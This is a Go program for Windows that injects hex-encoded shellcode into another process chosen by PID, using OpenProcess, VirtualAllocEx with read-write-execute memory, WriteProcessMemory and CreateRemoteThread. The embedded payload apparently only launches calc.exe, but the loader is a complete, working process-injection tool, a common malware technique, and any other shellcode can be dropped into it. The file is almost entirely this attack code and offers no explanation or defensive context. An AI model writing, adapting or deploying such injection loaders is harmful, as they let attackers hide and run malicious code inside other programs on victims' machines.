package main

//Createremote thread, get the handle for the specified remote process, virtualalloc, write shellcode and execute it

import (
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"
)

const (
	PROCESS_ALL_ACCESS        = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	MEM_COMMIT                = 0x001000
	MEM_RESERVE               = 0x002000
	PAGE_EXECUTE_READ         = 0x20
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
)

var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	VirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	CreateRemoteThread  = kernel32.NewProc("CreateRemoteThread")
	OpenProcess         = kernel32.NewProc("OpenProcess")
	WriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
)

func main() {
	var payload string = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500"
	var pid int
	//flag.IntVar(&pid1, "p", 1234, "Enter the PID of process to spawn")
	//flag.Parse()
	flag.IntVar(&pid, "pid", 0, "Process ID to inject shellcode into")
	flag.Parse()
	shellcode, err := hex.DecodeString(payload)
	if err != nil {
		fmt.Printf("[!] Error decoding payload from hex:%s\n", err)
		os.Exit(1)
	}

	//Allocating the memory region in current process to write the shellcode into
	l_addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	//writing shellcode into the newly created memory region..
	l_addrptr := (*[6300000]byte)(unsafe.Pointer(l_addr))
	for i := 0; i < len(shellcode); i++ {
		l_addrptr[i] = shellcode[i]
	}
	//Accessing the process we want to inject into using OpenProcess call
	var F int = 0
	Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, uintptr(F), uintptr(pid))
	if Proc == 0 {
		err := errors.New("[!]Error opening the remote process..")
		log.Fatal(err)
	}
	//allocating memory in the remote process using VirtualAllocEx
	r_addr, _, _ := VirtualAllocEx.Call(Proc, uintptr(F), uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if r_addr == 0 {
		err := errors.New("[!]Error creating memory region the remote process..")
		log.Fatal(err)
	}
	// writing the shellcode into the newly created memory region using writeprocessmemory
	WriteRemScode, _, _ := WriteProcessMemory.Call(Proc, r_addr, l_addr, uintptr(len(shellcode)), uintptr(F))
	if WriteRemScode == 0 {
		err := errors.New("[!]Error writing shellcode to remote process..")
		log.Fatal(err)
	}
	//Calling the shellcode in remote process using createremotethread
	CreateRthread, _, _ := CreateRemoteThread.Call(Proc, uintptr(F), 0, r_addr, uintptr(F), 0, uintptr(F))
	if CreateRthread == 0 {
		err := errors.New("[!]Error creating the thread in remote process..")
		log.Fatal(err)
	}
}
